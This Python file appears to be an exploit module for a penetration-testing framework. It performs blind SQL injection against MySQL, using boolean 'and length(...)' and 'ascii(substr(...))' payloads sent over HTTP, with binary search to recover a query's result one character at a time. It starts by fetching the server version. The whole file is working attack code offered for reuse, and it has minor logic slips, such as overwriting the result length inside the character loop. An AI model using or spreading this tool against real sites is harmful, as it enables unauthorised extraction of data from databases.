#!/usr/bin/python
#author: namhb
import sys, os, string
from libs.coreHTTPModule import coreHTTPModule
# Load core module
class module(coreHTTPModule):
	def __init__(self, logger, profile):
		coreHTTPModule.__init__(self, logger, profile)
		self.name							=	"Blind SQL injection Module"
		self.description 					=	"Blind SQL injection with binary search"
		self.rank							=	"HIGH"					# Exploit level
		self.type							=	"Exploit"				# Type: exploit | scanner | support
		self.author							=	"namhb"
		self.version						=	"0.0.1"
		self.maxLength 						=	255
		self.resultLength 					=	None
		self.result 						=	""
		self.basicOptions["PATTERN"] 		=	{
					"currentSetting"		:	None,
					"required"				:	True,
					"description"			:	"Pattern to check True/False"
		}
	def getMySQLLength(self, query):
		imin 								=	0
		imax 								=	self.maxLength
		i 									=	1
		while(imin <= imax):
			imid 							=	(imin + imax)/2
			# Equal payload
			equalPayload 					=	" and length({0})={1}".format(query, imid)
			if(self.checkQuery(equalPayload) == True):
				# If found key
				self.resultLength 			= 	imid
				return imid
			elif(self.checkQuery(" and {0}<length({1})".format(imid,query)) == True):
				# < key
				imin 						= 	imid + 1;
			else:
				imax 						= 	imid - 1;
		return None
	def getMySQLVersion(self):
		# Query = version()
		self.logger.info("Get MySQL version")
		self.runMySQLQuery("version()")
	def runMySQLQuery(self, query):
		self.logger.info("Run query: {0}".format(query))
		self.getMySQLLength(query)
		if(self.resultLength == None):
			self.logger.info("Can`t not get query!")
			exit()
		self.logger.info("Result length: {0}".format(self.resultLength))
		self.getMySQLQueryResult(query)
		self.logger.info("Result: {0}".format(self.result))
		# Clean result
		self.resultLength 					=	0
		self.result 						=	""
	def getMySQLQueryResult(self, query):
		# Binary search
		if(self.resultLength != None):
			for i in range(0, self.resultLength):
				# Single character
				imin 						=	0
				imax 						=	self.maxLength
				while(imin <= imax):
					imid 					=	(imin + imax)/2
					# Equal payload
					equalPayload 			=	" and ascii(substr({0},{1},1))={2}".format(query, (i+1), imid)
					if(self.checkQuery(equalPayload) == True):
						# If found key
						self.resultLength 	= 	imid
						self.logger.info("Found character number {0} is: {1}".format(i+1, chr(imid)))
						self.result 		+=	chr(imid)
						break
					elif(self.checkQuery(" and {0}<ascii(substr({1},{2},1))".format(imid,query, (i+1))) == True):
						# < key
						imin 				= 	imid + 1;
					else:
						imax 				= 	imid - 1;
				if(imin > imax):
					self.logger.info("Character not found!")
					exit()
		# Second get result
	def checkQuery(self, payload):
		# Return true/false of query
		# If contain, return True, if not, return False
		# Or use regex
		r 									=	self.sendHTTPRequest(payload)
		if(r.text.find(self.basicOptions["PATTERN"]["currentSetting"]) > 0):
			return True
		else:
			return False
	def run(self):
		# We coding here
		# Query ex: select version() from dual
		self.getMySQLVersion()
